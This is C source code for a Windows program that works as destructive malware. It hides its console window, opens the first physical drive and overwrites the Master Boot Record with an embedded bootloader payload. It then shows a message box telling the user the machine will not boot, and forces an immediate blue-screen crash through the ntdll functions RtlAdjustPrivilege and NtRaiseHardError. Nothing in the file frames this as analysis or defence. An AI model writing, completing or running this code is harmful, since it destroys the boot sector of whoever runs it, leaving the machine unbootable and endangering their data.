#include <windows.h>
#include "exported.h"
int main()
{
	FreeConsole(); //Hide the console.
	DWORD dw;
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	//Now that we have a handle to the Master Boot Record,
	//We're going to overwrite its contents with the bootloader
	WriteFile(hDrive, mbrData, sizeof(mbrData), &dw, NULL);
	//DONE!
	//Now let's close the handle...
	CloseHandle(hDrive);
	//Show a message box.
	MessageBox(NULL, "I don't think your computer is going to be able to boot up next time...", "NOTIFICATION", MB_OK | MB_ICONERROR);
	//If the user clicks OK, cause an immediate BSoD.
	//(Credit: Leurak :P)
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now cause BSOD.
	}
	return 0;
}
